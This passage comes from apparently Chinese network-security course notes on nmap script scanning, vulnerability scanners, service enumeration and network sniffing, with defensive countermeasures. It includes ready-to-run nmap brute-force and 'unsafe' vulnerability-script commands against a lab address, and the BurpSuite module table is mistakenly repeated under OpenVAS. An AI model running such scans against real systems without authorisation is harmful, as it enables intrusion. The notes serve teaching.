class="line"></span><br><span class="line">脚本扫描		/usr/share/nmap/scripts</span><br><span class="line">				nmap --script=default 192.168.137.144</span><br><span class="line">				nmap --script=auth 192.168.137.144</span><br><span class="line">				nmap --script=brute 192.168.137.144</span><br><span class="line">				nmap --script=vuln 192.168.137.144</span><br><span class="line">				nmap --script=broadcast 192.168.137.144</span><br><span class="line">				nmap --script=smb-brute.nse 192.168.137.144</span><br><span class="line">				nmap --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.144</span><br><span class="line">				nmap --script=smb-vuln-conficker.nse --script-args=unsafe=1 192.168.137.144</span><br><span class="line">				nmap -p3306 --script=mysql-empty-password.nse 192.168.137.144</span><br></pre></td></tr></table></figure>
<p>UDP、ICMP首部长度8byte，TCP、IP首部长度20byte</p>
<p>zenmap——图形化nmap</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap T4 -A -v 192.168.137.144</span><br><span class="line">-T	设置速度等级，1-5级，数字越大速度越快</span><br><span class="line">-A	综合扫描</span><br><span class="line">-v	输出扫描过程</span><br></pre></td></tr></table></figure>
<h4 id="10-3-2-5-漏洞扫描"><a href="#10-3-2-5-漏洞扫描" class="headerlink" title="10.3.2.5 漏洞扫描"></a>10.3.2.5 漏洞扫描</h4><p>系统攻防的核心：安全漏洞、Exploit(渗透攻击)/恶意代码、安全防御与检测机制三者之间的技术博弈。</p>

<p>漏洞扫描技术：</p>
<ul>
<li>检查系统是否存在已公布安全漏洞，从而易于遭受网络攻击的技术。</li>
<li>双刃剑<br>-网络管理员用来检查系统安全性，渗透测试团队(Red Team)用于安全评估。<br>-攻击者用来列出最可能成功的攻击方法，提高攻击效率。</li>
</ul>
<p>已发布安全漏洞数据库：</p>
<ul>
<li><p>业界标准漏洞命名库Common Vulnerabilities and Exposures([CVE][<a target="_blank" rel="noopener" href="http://cve.mitre.org">http://cve.mitre.org</a>])</p>
<ul>
<li>一本漏洞字典，为大家广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。</li>
<li>CVE标准使用一个共同的名字，帮助用户在各自独立的各种漏洞数据库中和漏洞评估工具中共享数据，虽然这些工具很难整合在一起。</li>
</ul>
</li>
<li><p>National Vulnerability Database([NVD][ <a target="_blank" rel="noopener" href="https://nvd.nist.gov">https://nvd.nist.gov</a> ])</p>
</li>
<li>国家信息安全漏洞共享平台([CNVD][•<a target="_blank" rel="noopener" href="https://www.cnvd.org.cn">https://www.cnvd.org.cn</a>])</li>
</ul>
<p>The Common Vulnerability Scoring System(CVSS)</p>
<ul>
<li>基本分：漏洞固有的、根本性的属性</li>
<li>时间分：漏洞与时间相关的属性</li>
<li>环境分：不同用户环境中产品安全漏洞所造成的危害程度</li>
</ul>

<div class="table-container">
<table>
<thead>
<tr>
<th>等级</th>
<th>CVSS分数</th>
</tr>
</thead>
<tbody>
<tr>
<td>None</td>
<td>0</td>
</tr>
<tr>
<td>Low</td>
<td>0.1-3.9</td>
</tr>
<tr>
<td>Medium</td>
<td>4.0-6.9</td>
</tr>
<tr>
<td>High</td>
<td>7.0-8.9</td>
</tr>
<tr>
<td>Critical</td>
<td>9.0-10.0</td>
</tr>
</tbody>
</table>
</div>
<h5 id="10-3-2-4-1-漏洞扫描软件"><a href="#10-3-2-4-1-漏洞扫描软件" class="headerlink" title="10.3.2.4.1 漏洞扫描软件"></a>10.3.2.4.1 漏洞扫描软件</h5><h6 id="10-3-2-4-1-1-Nessus"><a href="#10-3-2-4-1-1-Nessus" class="headerlink" title="10.3.2.4.1.1 Nessus"></a>10.3.2.4.1.1 Nessus</h6><p>目前最优秀的共享漏洞扫描软件<a target="_blank" rel="noopener" href="http://www.nessus.org/">http://www.nessus.org/</a></p>
<p>一个功能强大而又易于使用的网络漏洞扫描工具，运行于 Linux, Windows, OSX, BSD, Solaris等系统。    </p>
<p>该系统被设计为客户/服务器模式，服务器端负责进行安全扫描，客户端用来配置、管理服务器端，客户端和服务器端之间的通信使用SSL加密。</p>
<p>第一个使用插件的漏洞扫描工具，支持实时的插件升级，具有检测漏洞多、准确、速度快的特点使其在众多漏洞扫描器中脱颖而出。其强大的功能是依赖于其丰富的插件来实现的。</p>
<p>客户端/服务器模式</p>
<ul>
<li>服务器端: nessesd(Tcp1241)</li>
<li>客户端: nessus-q (命令行客户端), nessus(UNIX图形客户端), Nessus Client(Win32客户端)</li>
</ul>
<p>框架/插件模式</p>
<ul>
<li>安全漏洞扫描插件: 使用NASL语言容易编写并集成至Nessus框架中</li>
<li>插件间可互相依赖和协同工作(端口探测－漏洞扫描插件)</li>
</ul>
<p>NASL语言(Nessus Attack Scripting Language)</p>
<p>多种报告方式：<br>文本/LaTeX/HTML/DHTML/XML/SQL等</p>
<p>Nessus体系结构：</p>

<p>(1)客户端程序向服务端程序发送详细的扫描任务的参数(遵循nessus传输协议)；</p>
<p>(2)服务端程序接收到客户端程序的请求后，加载完成任务所需要的插件，并合理安排插件的执行顺序；</p>
<p>(3)NASL语言解释器执行插件，在执行插件扫描过程中会与扫描目标之间有一些数据交互；</p>
<p>(4)NASL解释器判断扫描结果，并报告给服务端程序；</p>
<p>(5)服务端程序归纳从NASL解释器收到的扫描结果，生成漏洞报告反馈给客户端程序。</p>
<h6 id="10-3-2-4-1-2-AWVS"><a href="#10-3-2-4-1-2-AWVS" class="headerlink" title="10.3.2.4.1.2 AWVS"></a>10.3.2.4.1.2 AWVS</h6><p>通过网络爬虫测试你的网站安全，检测流行安全漏洞。</p>
<h6 id="10-3-2-4-1-3-AppScan"><a href="#10-3-2-4-1-3-AppScan" class="headerlink" title="10.3.2.4.1.3 AppScan"></a>10.3.2.4.1.3 AppScan</h6><h6 id="10-3-2-4-1-4-BurpSuite"><a href="#10-3-2-4-1-4-BurpSuite" class="headerlink" title="10.3.2.4.1.4 BurpSuite"></a>10.3.2.4.1.4 BurpSuite</h6><p>功能模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">target		目标模块用于设置扫描域、生成站点地图、生成安全分析</span><br><span class="line">proxy		代理模块用于拦截浏览器的http会话内容</span><br><span class="line">spider		爬虫模块用于自动爬取网站的每个页面内容，并生成完成的网站地图</span><br><span class="line">scanner		扫描模块用于自动化检测漏洞，分为主动和被动扫描</span><br><span class="line">intruder	入侵模块根据上面检测到的可能存在漏洞的链接，调用攻击载荷，对目标链接进行攻击</span><br><span class="line">			入侵模块的原理是根据访问链接中存在的参数/变量，调用本地词典、攻击载荷，对参数进行渗透测试</span><br><span class="line">repeater	重放模块用于实现请求重放，通过修改参数进行手工请求回应的调试</span><br><span class="line">sequencer	序列器模块用于检测参数的随机性，例如密码或者令牌是否可预测，以此判断关键数据是否可被伪造</span><br><span class="line">decoder		解码器模块用于实现对URL、HTML、Base64、ASCII、二八十六进制、哈希等编码转换</span><br><span class="line">comparer	对比模块用于对两次不用的请求和回应进行可视化对比，以此区分不同参数对结果造成的影响</span><br><span class="line">extender	通过拓展模块，可以加载自己开发的、或者第三方模块，打造自己的burpsuite功能</span><br><span class="line">			通过burpsuite提供的API接口，目前可以支持Java、Python、Ruby三种语言的模块编写</span><br><span class="line">options		分为project/user options，主要对软件进行全局设置</span><br><span class="line">alerts		显示软件的使用日志信息</span><br></pre></td></tr></table></figure>
<h6 id="10-3-2-4-1-5-OpenVAS"><a href="#10-3-2-4-1-5-OpenVAS" class="headerlink" title="10.3.2.4.1.5 OpenVAS"></a>10.3.2.4.1.5 OpenVAS</h6><p>开放式漏洞评估系统，是一个用于评估目标漏洞的杰出框架，开源且功能十分强大。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.openvas.org</span><br><span class="line">http://www.greenbone.net</span><br></pre></td></tr></table></figure>
<p>不装了这能装一天。。下面给个安装教程吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">升级kali</span><br><span class="line">apt-get update</span><br><span class="line">apt-get dist-upgrade</span><br><span class="line"></span><br><span class="line">安装OpenVAS</span><br><span class="line">apt-get install openvas</span><br><span class="line">openvas-setup</span><br><span class="line"></span><br><span class="line">修改admin账户密码</span><br><span class="line">openvasmd --user=admin --new-password=password</span><br><span class="line"></span><br><span class="line">启动openvas</span><br><span class="line">openvas-start</span><br><span class="line"></span><br><span class="line">检查安装，一定要先启动再检查</span><br><span class="line">ss -tnlp</span><br><span class="line">openvas-check-setup</span><br><span class="line"></span><br><span class="line">登录openvas</span><br><span class="line">https://192.168.137.144:9392</span><br></pre></td></tr></table></figure>
<p>功能模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">target		目标模块用于设置扫描域、生成站点地图、生成安全分析</span><br><span class="line">proxy		代理模块用于拦截浏览器的http会话内容</span><br><span class="line">spider		爬虫模块用于自动爬取网站的每个页面内容，并生成完成的网站地图</span><br><span class="line">scanner		扫描模块用于自动化检测漏洞，分为主动和被动扫描</span><br><span class="line">intruder	入侵模块根据上面检测到的可能存在漏洞的链接，调用攻击载荷，对目标链接进行攻击</span><br><span class="line">			入侵模块的原理是根据访问链接中存在的参数/变量，调用本地词典、攻击载荷，对参数进行渗透测试</span><br><span class="line">repeater	重放模块用于实现请求重放，通过修改参数进行手工请求回应的调试</span><br><span class="line">sequencer	序列器模块用于检测参数的随机性，例如密码或者令牌是否可预测，以此判断关键数据是否可被伪造</span><br><span class="line">decoder		解码器模块用于实现对URL、HTML、Base64、ASCII、二八十六进制、哈希等编码转换</span><br><span class="line">comparer	对比模块用于对两次不用的请求和回应进行可视化对比，以此区分不同参数对结果造成的影响</span><br><span class="line">extender	通过拓展模块，可以加载自己开发的、或者第三方模块，打造自己的burpsuite功能</span><br><span class="line">			通过burpsuite提供的API接口，目前可以支持Java、Python、Ruby三种语言的模块编写</span><br><span class="line">options		分为project/user options，主要对软件进行全局设置</span><br><span class="line">alerts		显示软件的使用日志信息</span><br></pre></td></tr></table></figure>
<h5 id="10-3-2-4-2-防范措施"><a href="#10-3-2-4-2-防范措施" class="headerlink" title="10.3.2.4.2 防范措施"></a>10.3.2.4.2 防范措施</h5><p>最简单对策：</p>
<ul>
<li>假设黑客会使用漏洞扫描来发现目标网络弱点，那你必须在黑客之前扫描漏洞</li>
<li>补丁自动更新和分发: 修补漏洞</li>
</ul>
<p>联邦桌面核心配置计划(FDCC)</p>
<ul>
<li>确保桌面计算机的安全漏洞及补丁自动管理</li>
</ul>
<p>检测和防御漏洞扫描行为</p>
<ul>
<li>网络入侵检测系统: Snort</li>
<li>仔细审查防火墙配置规则</li>
</ul>
<h3 id="10-3-3-网络查点"><a href="#10-3-3-网络查点" class="headerlink" title="10.3.3 网络查点"></a>10.3.3 网络查点</h3><p>针对已知的弱点，对识别出来的服务进行更加充分更具针对性的探查，来寻找真正可以攻击的入口，以及攻击过程中可能需要的关键数据。</p>
<p>与网络踩点、扫描的区别</p>
<ul>
<li>与网络踩点技术的关键区别：攻击者的入侵程度</li>
<li>与网络扫描技术的关键区别：攻击者的针对性与信息收集的目标性</li>
</ul>
<h4 id="10-3-3-1-网络查点能够收集到的信息"><a href="#10-3-3-1-网络查点能够收集到的信息" class="headerlink" title="10.3.3.1 网络查点能够收集到的信息"></a>10.3.3.1 网络查点能够收集到的信息</h4><p>用户账户名、错误配置的共享资源、网络服务版本号，这些看起来好像是无害的，但一旦这些信息被细心的高水平攻击者所掌握，就可能成为危害目标系统安全的祸根。</p>
<ul>
<li>用户帐户名：口令猜测破解</li>
<li>错误配置的共享资源：恶意程序上传</li>
<li>老旧的网络服务版本：缓冲区溢出漏洞攻击</li>
</ul>
<h4 id="10-3-3-2-网络查点技术"><a href="#10-3-3-2-网络查点技术" class="headerlink" title="10.3.3.2. 网络查点技术"></a>10.3.3.2. 网络查点技术</h4><h5 id="10-3-3-2-1-网络服务旗标抓取技术"><a href="#10-3-3-2-1-网络服务旗标抓取技术" class="headerlink" title="10.3.3.2.1 网络服务旗标抓取技术"></a>10.3.3.2.1 网络服务旗标抓取技术</h5><p>最基础和最通用的技术方法。利用客户端工具连接至远程网络服务并观察输出以收集关键信息的技术手段。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-telnet</span><br><span class="line">-netcat</span><br></pre></td></tr></table></figure>
<h5 id="10-3-3-2-2-通用网络服务查点"><a href="#10-3-3-2-2-通用网络服务查点" class="headerlink" title="10.3.3.2.2 通用网络服务查点"></a>10.3.3.2.2 通用网络服务查点</h5><ul>
<li><p>跨平台，常用服务</p>
</li>
<li><p>Web服务、FTP文件传输服务、POP3及SMTP电子邮件收发服务</p>
</li>
</ul>
<h6 id="10-3-3-2-2-1-FTP服务查点"><a href="#10-3-3-2-2-1-FTP服务查点" class="headerlink" title="10.3.3.2.2.1 FTP服务查点"></a>10.3.3.2.2.1 FTP服务查点</h6><p>-控制协议TCP 21端口，没有任何加密，明文传输口令<br>-匿名登录，甚至匿名上传与下载文件<br>-FTP查点很简单：使用FTP客户端程序连接即可<br>-FTP服务旗标、共享目录、可写目录等信息，可能还会提供FTP帐户名等信息<br>-查点后攻击：弱口令猜测与破解、已知FTP服务漏洞渗透攻击</p>
<h6 id="10-3-3-2-2-2-SMTP服务查点"><a href="#10-3-3-2-2-2-SMTP服务查点" class="headerlink" title="10.3.3.2.2.2 SMTP服务查点"></a>10.3.3.2.2.2 SMTP服务查点</h6><p>SMTP电子邮件发送协议查点<br>-最经典的网络服务查点技术之一<br>-两类特殊指令VRFY和EXPN<br>-VRFY指令：对合法用户的名字进行验证<br>-EXPN指令：显示假名与邮件表实际发送地址<br>-可验证和搜索邮件服务器上的活跃帐户</p>
<p>SMTP电子邮件发送协议查点危害<br>-伪造更具欺骗性电子邮件，社会工程学攻击<br>-探测SMTP服务器枚举出其中有效的电子邮件地址列表，大量发生垃圾邮件</p>
<h5 id="10-3-3-2-3-类Unix平台网络服务查点"><a href="#10-3-3-2-3-类Unix平台网络服务查点" class="headerlink" title="10.3.3.2.3 类Unix平台网络服务查点"></a>10.3.3.2.3 类Unix平台网络服务查点</h5><p>古老的finger, rwho, rusers查点<br>-用户帐户和登录信息<br>-已不常用</p>
<p>RPC查点(TCP/UDP 111, 32771)<br>-RPC远程过程调用: portmapperrpcbind<br>-RPC查点工具<br>    rpcinfo-p HOST: 枚举主机上提供的RPC服务<br>    rpcdump(Windows平台运行)<br>    nmap-sS-sRHOST</p>
<p>RPC查点防御策略<br>-Secure RPC, 111/32771端口防火墙过滤</p>
<h5 id="10-3-3-2-4-Windows平台网络服务查点"><a href="#10-3-3-2-4-Windows平台网络服务查点" class="headerlink" title="10.3.3.2.4 Windows平台网络服务查点"></a>10.3.3.2.4 Windows平台网络服务查点</h5><p>Windows网络服务</p>
<ul>
<li><p>NetBIOS网络基本输入输出系统服务</p>
<p>-Windows独有的局域网组网协议</p>
</li>
<li><p>SMB文件与打印共享服务</p>
</li>
<li><p>AD活动目录与LDAP轻量级目录访问协议</p>
</li>
<li><p>MSRPC微软远过程调用服务</p>
<p>-PRC/DCOM</p>
</li>
</ul>
<p>Windows平台网络服务查点<br>-NetBIOS主机查点<br>-SMB会话查点<br>-目录查点<br>-MSRPC查点</p>
<h6 id="10-3-3-2-4-1-Windows-Networking-API"><a href="#10-3-3-2-4-1-Windows-Networking-API" class="headerlink" title="10.3.3.2.4.1 Windows Networking API"></a>10.3.3.2.4.1 Windows Networking API</h6><ul>
<li><p>WinSock API</p>
</li>
<li><p>命名管道(Named Pipes)和邮件槽(Mail Slots)</p>
<ul>
<li>命名管道：提供可靠双向通信，协议无关的标识Windows网络资源的方法</li>
<li>邮件槽：提供不可靠的单向数据传输，支持广播</li>
</ul>
</li>
<li><p>Web访问API</p>
<p>-WinInet/WinHTTP/HTTP API</p>
</li>
</ul>
<h6 id="10-3-3-2-4-2-NetBIOS"><a href="#10-3-3-2-4-2-NetBIOS" class="headerlink" title="10.3.3.2.4.2 NetBIOS"></a>10.3.3.2.4.2 NetBIOS</h6><ul>
<li><p>NetBIOS(网络基本输入/输出系统)：最初由IBM开发，MS利用NetBIOS作为构建局域网的上层协议</p>
</li>
<li><p>NetBIOS使得程序和网络之间有了标准的接口，方便应用程序的开发。并且可以移植到其他的网络中</p>
</li>
<li><p>NetBIOS位于OSI模型会话层，TCP/IP之上</p>
</li>
<li><p>NetBIOS有两种通讯模式</p>
<ul>
<li>会话模式。一对一进行通讯，LAN中的机器之间建立会话，可以传输较多的信息，并且可以检查传输错误</li>
<li>数据报模式。可以进行广播或者一对多的通讯，传输数据大小受限制，没有错误检查机制，也不必建立通讯会话</li>
</ul>
</li>
<li><p>NetBIOS over TCP/IP，支持三种服务</p>
<ul>
<li>名字服务UDP 137</li>
<li>会话服务TCP 139/445</li>
<li>数据报服务UDP 138</li>
</ul>
</li>
</ul>
<p>NetBIOS网络查点</p>
<ul>
<li><p>使用net view命令查点域</p>
<ul>
<li>列出网络上的工作组和域：net view /domain</li>
<li>列出指定组/域中的所有计算机：net view /domain:DOMAIN_NAME</li>
</ul>

</li>
<li><p>查点域控制器</p>
<ul>
<li><p>Windows Resource Kit -nltest工具</p>
<p>Nltest.exe 是非常强大的命令行实用程序，用于测试在 Windows NT 域中的信任关系和域控制器复制的状态。域包含，还有一个主域控制器 (PDC) 和零个或多个备份域控制器 (BDC) 的域控制器。</p>
</li>
</ul>

</li>
<li><p>查点主机上的NetBIOS名字表</p>
<ul>
<li><p>nbtstat工具</p>
<p>主机中的NetBIOS名字表</p>
<p>计算机名、所在域、当前登录用户、当前运行服务和网卡硬件MAC地址</p>
</li>
</ul>

<ul>
<li><p>nbtscan工具</p>
<p>对整个局域网进行快速的nbtstat查询</p>
<p>NBTscan是一款在IP网络上扫描NetBIOS名称信息的工具。它通过给指定范围内所有地址发送状态查询来获得反馈信息并以表形式呈现给使用者。每一地址的反馈信息包括IP地址、NetBIOS计算机名、登录用户、MAC地址。</p>
</li>
</ul>
</li>
<li><p>其他工具</p>
<p>epdump, rpcdump, getmac, netdom, netviewx, Winfo, nbtdump, …</p>
</li>
<li><p>防范措施</p>
<ul>
<li>网络：防火墙禁止外部访问TCP/UDP 135-139，445端口</li>
<li>主机：配置IPSec过滤器，主机个人防火墙，禁用Alerter和Messenger服务</li>
</ul>
</li>
</ul>
<h6 id="10-3-3-2-4-3-MSRPC远程进程调用-DCOM"><a href="#10-3-3-2-4-3-MSRPC远程进程调用-DCOM" class="headerlink" title="10.3.3.2.4.3 MSRPC远程进程调用/DCOM"></a>10.3.3.2.4.3 MSRPC远程进程调用/DCOM</h6><p>RPC (Remote Procedure Call)</p>
<ul>
<li>网络编程标准</li>
<li>目的: 提供“能在某种程度上像应用程序开发人员隐藏有关网络编程细节”的编程模型</li>
</ul>
<p>RPC调用</p>
<ul>
<li>允许程序员编写的客户应用程序跨网络调用远程计算机上服务器应用程序中的过程</li>
</ul>
<p>客户机对服务器的RPC调用操作：</p>
<p>1.调用客户端句柄；执行传送参数<br>2.调用本地系统内核发送网络消息<br>3.消息传送到远程主机<br>4.服务器句柄得到消息并取得参数<br>5.执行远程过程<br>6.执行的过程将结果返回服务器句柄<br>7.服务器句柄返回结果，调用远程系统内核<br>8.消息传回本地主机<br>9.客户句柄由内核接收消息<br>10.客户接收句柄返回的数据</p>

<h6 id="10-3-3-2-4-4-COM-DCOM"><a href="#10-3-3-2-4-4-COM-DCOM" class="headerlink" title="10.3.3.2.4.4 COM/DCOM"></a>10.3.3.2.4.4 COM/DCOM</h6><p>COM对象: 使应用程序由不同组件构成，导出面向对象接口，提高软件模块化、可扩展性和可交互性。</p>
<p>DCOM: 提供COM组件的位置透明性，依赖于RPC</p>
<h6 id="10-3-3-2-4-5-常用的Windows应用层网络服务"><a href="#10-3-3-2-4-5-常用的Windows应用层网络服务" class="headerlink" title="10.3.3.2.4.5 常用的Windows应用层网络服务"></a>10.3.3.2.4.5 常用的Windows应用层网络服务</h6><ul>
<li><p>Network Applications</p>
</li>
<li><p>IIS (Internet Information Services)<br>HTTP/FTP/…</p>
</li>
<li>Email<br>Exchange Server</li>
<li>Database<br>MS SQL Server</li>
<li>RDP<br>Remote Desktop Protocol</li>
<li>通常以Windows服务方式后台运行</li>
</ul>
<h6 id="10-3-3-2-4-6-Windows服务"><a href="#10-3-3-2-4-6-Windows服务" class="headerlink" title="10.3.3.2.4.6 Windows服务"></a>10.3.3.2.4.6 Windows服务</h6><ul>
<li><p>Windows服务－系统启动时刻启动进程的机制，提供不依赖于任何交互式的服务。</p>
</li>
<li><p>Windows服务</p>
<ul>
<li>服务应用程序<br>注册服务Advapi32.dll, CreateService/StartServices<br>注册表: HKLM\SYSTEM\CurrentControlSet\Services<br>共享服务进程: 服务宿主svchost.exe</li>
<li>服务控制管理器(SCM, service control manager, services.exe)<br>Winlogon进程在加载GINA之前执行SCM启动函数<br>SCM中的ScCreateServiceDB根据注册表分别启动服务<br>SCM中的ScAutoStartServices启动“自动启动”的服务</li>
<li>服务控制程序(SCP, service control program)<br>控制面板，服务插件…</li>
</ul>
</li>
</ul>
<h1 id="11-网络嗅探与协议分析"><a href="#11-网络嗅探与协议分析" class="headerlink" title="11. 网络嗅探与协议分析"></a>11. 网络嗅探与协议分析</h1><ul>
<li>网络嗅探(Sniff)</li>
</ul>
<p>–网络监听、网络窃听</p>
<p>–类似于传统的电话线窃听</p>
<ul>
<li>网络嗅探技术定义</li>
</ul>
<p>–利用计算机网络接口截获目的地为其他计算机的数据报文</p>
<p>–监听网络流中所包含的用户账户密码或私密信息等</p>
<ul>
<li>网络嗅探器(Sniffer)</li>
</ul>
<p>–实现嗅探的软件或硬件设备</p>
<p>–嗅探获得数据二进制格式数据报文</p>
<p>–解析和理解二进制数据，获取各层协议字段和应用层传输数据网络协议分析</p>
<ul>
<li><p>危害与作用</p>
<ul>
<li><p>攻击者：内网渗透技术</p>
<p>窃取机密信息，为发起进一步攻击收集信息</p>
</li>
<li><p>防御者</p>
<p>管理员可以用来监听网络的流量情况，定位网络故障</p>
<p>为网络入侵检测系统提供底层数据来源基础</p>
</li>
<li><p>其他作用</p>
<p>开发网络应用的程序员可以监视程序的网络情况</p>
</li>
</ul>
</li>
<li><p>网络嗅探技术与工具分类</p>
<ul>
<li>以太网嗅探</li>
<li>WiFi嗅探</li>
<li>…</li>
<li>目前一些著名嗅探器支持多种链路层网络嗅探，wireshark, Sniffer Pro…</li>
</ul>
</li>
<li><p>工具形态</p>
<ul>
<li>软件嗅探器</li>
<li>硬件嗅探器(协议分析仪): 专用设备, 速度快, 额外功能(如流量记录与重放等), 价格昂贵</li>
</ul>
</li>
</ul>
<h2 id="11-1-以太网络"><a href="#11-1-以太网络" class="headerlink" title="11.1 以太网络"></a>11.1 以太网络</h2><h3 id="11-1-1-工作原理"><a href="#11-1-1-工作原理" class="headerlink" title="11.1.1 工作原理"></a>11.1.1 工作原理</h3><ul>
<li>载波侦听/冲突检测(CSMA/CD: 802.3, carrier sense multiple access with collision detection)技术<ul>
<li>载波侦听：是指在网络中的每个站点都具有同等的权利，在传输自己的数据时，首先监听信道是否空闲<pre><code>如果空闲，就传输自己的数据
  如果信道被占用，就等待信道空闲
</code></pre></li>
<li>而冲突检测则是为了防止发生两个站点同时监测到网络没有被使用时而产生冲突</li>
</ul>
</li>
<li>以太网采用了CSMA/CD技术，由于使用了广播机制，所以，所有在同一媒介信道上连接的工作站都可以看到网络上传递的数据。</li>
</ul>
<h3 id="11-1-2-工作模式"><a href="#11-1-2-工作模式" class="headerlink" title="11.1.2 工作模式"></a>11.1.2 工作模式</h3><ul>
<li><p>网卡的MAC地址(48位)</p>
<p>–通过ARP来解析MAC与IP地址的转换</p>
<p>–用ipconfig/ifconfig可以查看MAC地址</p>
</li>
<li><p>正常情况下，网卡应该只接收这样的包</p>
<p>–MAC地址与自己相匹配的数据帧</p>
<p>–广播包</p>
</li>
<li><p>网卡完成收发数据包的工作，两种接收模式</p>
<p>–混杂模式：不管数据帧中的目的地址是否与自己的地址匹配，都接收下来</p>
<p>–非混杂模式：只接收目的地址相匹配的数据帧，以及广播数据包(和组播数据包)</p>
</li>
<li><p>为了监听网络上的流量，必须设置为混杂模式</p>
</li>
</ul>
<h2 id="11-2-共享式网络与交换式网络"><a href="#11-2-共享式网络与交换式网络" class="headerlink" title="11.2 共享式网络与交换式网络"></a>11.2 共享式网络与交换式网络</h2><h3 id="11-2-1-共享式网络"><a href="#11-2-1-共享式网络" class="headerlink" title="11.2.1 共享式网络"></a>11.2.1 共享式网络</h3><p>–通过Hub(集线器)连接</p>
<p>–总线方式: 通过网络的所有数据包</p>
<p>–发往每一个主机</p>
<p>–能够嗅探整个Hub上全部网络流量</p>

<h3 id="11-2-2-交换式网络"><a href="#11-2-2-交换式网络" class="headerlink" title="11.2.2 交换式网络"></a>11.2.2 交换式网络</h3><p>–通过Switch(交换机)连接</p>
<p>–由交换机构造一个“MAC地址-端口”映射表</p>
<p>–发送包的时候，只发到特定端口上</p>
<p>–只能监听同一端口上流量</p>
<p>–可通过流量映像口监听(SPAN)</p>

<h4 id="11-2-2-1-交换式网络中的嗅探攻击"><a href="#11-2-2-1-交换式网络中的嗅探攻击" class="headerlink" title="11.2.2.1 交换式网络中的嗅探攻击"></a>11.2.2.1 交换式网络中的嗅探攻击</h4><ul>
<li><p>MAC地址洪泛攻击</p>
<p>向交换机发送大量虚构MAC地址和IP地址数据包<br>致使交换机“MAC地址-端口映射表”溢出<br>交换机切换入所谓的“打开失效”模式-“共享式”</p>
</li>
<li><p>MAC欺骗</p>
<p>假冒所要监听的主机网卡，将源MAC地址伪造成目标主机的MAC地址<br>交换机不断地更新它的“MAC地址-端口映射表”<br>交换机就会将本应发送给目标主机的数据包发送给攻击者</p>
</li>
<li><p>ARP欺骗(中间人攻击)</p>
<p>利用IP地址与MAC地址之间进行转换时的协议漏洞</p>
</li>
</ul>
<h2 id="11-3-应用程序抓包的技术"><a href="#11-3-应用程序抓包的技术" class="headerlink" title="11.3 应用程序抓包的技术"></a>11.3 应用程序抓包的技术</h2><ul>
<li><p>类Unix平台提供了标准的API支持</p>
<p>内核态: BPF(Berkeley Packet Filter)<br>用户态函数库：libpcap<br>用户态嗅探程序：tcpdump等</p>
</li>
<li><p>Windows平台通过驱动程序来抓取数据包</p>
<p>驱动程序: NPF(NetGroupPacket Filter)<br>用户态函数库：winpcap<br>用户态嗅探程序：windump等</p>
</li>
</ul>
<h3 id="11-3-1-BPF"><a href="#11-3-1-BPF" class="headerlink" title="11.3.1 BPF"></a>11.3.1 BPF</h3><ul>
<li><p>BSD数据包捕获</p>
<p>–BPF是一个核心态的组件，支持数据包“过滤”抓取</p>
<p>–Network Tap接收所有的数据包</p>
<p>–BPF虚拟机机器语言的解释器，比较/算术等操作</p>
<p>–Kernel Buffer，保存过滤器送过来的数据包</p>
<p>–User buffer，用户态上的数据包缓冲区</p>
</li>
<li><p>Libpcap(一个抓包工具库)支持BPF</p>
<p>–Libpcap是用户态的一个抓包工具</p>
<p>–Libpcap几乎是系统无关的</p>
</li>
<li><p>BPF是一种比较理想的抓包方案</p>
<p>–在核心态，所以效率比较高</p>
<p>–目前类UNIX系统的标准抓包内核模块 </p>
</li>
</ul>

<h3 id="11-3-2-libpcap抓包库"><a href="#11-3-2-libpcap抓包库" class="headerlink" title="11.3.2 libpcap抓包库"></a>11.3.2 libpcap抓包库</h3><ul>
<li><p>用户态下的抓包库</p>
</li>
<li><p>系统独立的接口，C语言接口</p>
<p>–多种其他高级编程语言包装接口: Perl, Python, Ruby, Tcl, Java, …</p>
</li>
<li><p>广泛应用于</p>
<p>–网络统计软件</p>
<p>–入侵检测系统</p>
<p>–网络调试</p>
</li>
<li><p>支持过滤机制，BPF</p>
</li>
</ul>
<h2 id="11-4-pcap格式"><a href="#11-4-pcap格式" class="headerlink" title="11.4 pcap格式"></a>11.4 pcap格式</h2><p>基本格式：文件头、数据包头、数据报、数据包头、数据报…</p>

